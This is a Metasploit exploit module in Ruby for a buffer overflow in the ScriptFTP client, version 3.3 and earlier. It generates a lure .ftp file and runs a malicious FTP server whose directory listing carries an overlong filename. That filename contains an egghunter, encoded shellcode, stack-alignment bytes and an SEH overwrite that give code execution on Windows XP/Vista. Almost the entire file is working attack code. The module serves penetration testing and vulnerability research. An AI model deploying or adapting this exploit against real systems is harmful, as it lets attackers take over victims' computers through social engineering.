# $Id: scriptftp_list.rb 13841 2011-10-09 05:36:42Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::Remote::FtpServer
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;ScriptFTP <= 3.3 Remote Buffer Overflow (LIST)&#039;,
            &#039;Description&#039;    => %q{
                    AmmSoft&#039;s ScriptFTP client is susceptible to a remote buffer overflow
                vulnerability that is triggered when processing a sufficiently long filename during
                a FTP LIST command resulting in overwriting the exception handler. Social engineering
                of executing a specially crafted ftp file by double click will result in connecting to
                our malcious server and perform arbitrary code execution which allows the attacker
                to gain the same rights as the user running ScriptFTP.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => "$Revision: 13841 $",
            &#039;Author&#039;         =>
                [
                    &#039;modpr0be&#039;, #Vulnerability discovery and original exploit
                    &#039;TecR0c <roccogiovannicalvi[at]gmail.com>&#039;, # Metasploit module
                    &#039;mr_me <steventhomasseeley[at]gmail.com>&#039;,  # Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    #[ &#039;CVE&#039;, &#039;?&#039; ],
                    #[ &#039;OSVDB&#039;, &#039;?&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/17876/&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.kb.cert.org/vuls/id/440219&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                    &#039;DisablePayloadHandler&#039; => &#039;false&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039;        => "\x00\xff\x0d\x5c\x2f\x0a",
                    &#039;EncoderType&#039;     => Msf::Encoder::Type::AlphanumMixed,
                    &#039;EncoderOptions&#039;  =>
                    {
                        &#039;BufferRegister&#039; => &#039;EDI&#039;,  # Egghunter jmp edi
                    }
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    # CALL DWORD PTR SS:[EBP-4]
                    # scriptftp.exe - File version=Build 3/9/2009
                    [ &#039;Windows XP SP3 / Windows Vista&#039;, { &#039;Offset&#039; => 1746, &#039;Ret&#039; => "\xd6\x41" } ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Oct 12 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
            [
                OptString.new(&#039;FILENAME&#039;,   [ true, &#039;The file name.&#039;,  &#039;msf.ftp&#039;]),
            ], self.class)
 
    end
 
    def setup
        if datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;
            lhost = Rex::Socket.source_address(&#039;50.50.50.50&#039;)
        else
            lhost = datastore[&#039;SRVHOST&#039;]
        end
 
        ftp_file = "OPENHOST(&#039;#{lhost}&#039;,&#039;ftp&#039;,&#039;ftp&#039;)\r\n"
        ftp_file << "SETPASSIVE(ENABLED)\r\n"
        ftp_file << "GETLIST($list,REMOTE_FILES)\r\n"
        ftp_file << "CLOSEHOST\r\n"
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039;...")
        file_create(ftp_file)
        super
    end
 
 
    def on_client_unknown_command(c,cmd,arg)
        c.put("200 OK\r\n")
    end
 
    def on_client_command_list(c,arg)
 
        conn = establish_data_connection(c)
        if(not conn)
            c.put("425 Can&#039;t build data connection\r\n")
            return
        end
 
        print_status(" - Data connection set up")
        code = 150
        c.put("#{code} Here comes the directory listing.\r\n")
 
        code = 226
        c.put("#{code} Directory send ok.\r\n")
 
        eggoptions =
        {
            :checksum => false,
            :eggtag => &#039;cure&#039;
        }
 
        hunter, egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)
 
        # Encode with alphamixed, then unicode mixed
        [ &#039;x86/alpha_mixed&#039;, &#039;x86/unicode_mixed&#039; ].each { |name|
            enc = framework.encoders.create(name)
            if name =~ /unicode/
                # aligned to ESP & EAX
                enc.datastore.import_options_from_hash({ &#039;BufferRegister&#039; => &#039;EAX&#039; })
            else
                enc.datastore.import_options_from_hash({ &#039;BufferRegister&#039; => &#039;EDX&#039; })
            end
            # NOTE: we already eliminated badchars
            hunter = enc.encode(hunter, nil, nil, platform)
            if name =~/alpha/
                #insert getpc_stub & align EDX, unicode encoder friendly.
                #Hardcoded stub is not an issue here because it gets encoded anyway
                getpc_stub = "\x89\xe1\xdb\xcc\xd9\x71\xf4\x5a\x83\xc2\x41\x83\xea\x35"
                hunter = getpc_stub + hunter
            end
        }
 
        unicode_nop = "\x6d" # DD BYTE PTR DS:[ECX],AL
 
        nseh = "\x61" << unicode_nop
        seh = target.ret
 
        alignment = "\x54"  # PUSH ESP
        alignment << unicode_nop
        alignment << "\x58"  # POP EAX
        alignment << unicode_nop
        alignment << "\x05\x12\x11"  # ADD EAX,11001200
        alignment << unicode_nop
        alignment << "\x2d\x01\x01"  # SUB EAX,1000100
        alignment << unicode_nop
        alignment << "\x2d\x01\x10"  # SUB EAX,10000100
        alignment << unicode_nop
        alignment << "\x50"  # PUSH EAX
        alignment << unicode_nop
        alignment << "\xc3"  # RETN
 
        buffer = rand_text_alpha(656)
        buffer << hunter
        buffer << rand_text_alpha(target[&#039;Offset&#039;]-buffer.length)
        buffer << nseh
        buffer << seh
        buffer << alignment
        buffer << rand_text_alpha(500)
        buffer << egg
 
        print_status(" - Sending directory list via data connection")
        dirlist =  "-rwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 #{buffer}.txt\r\n"
        dirlist << "   5 ftpuser  ftpusers       512 Jul 26  2001 A\r\n"
        dirlist << "rwxr-xr-x   5 ftpuser  ftpusers       512 Jul 26  2001 #{buffer}.txt\r\n"
 
        conn.put(dirlist)
        conn.close
        return
    end
 
end



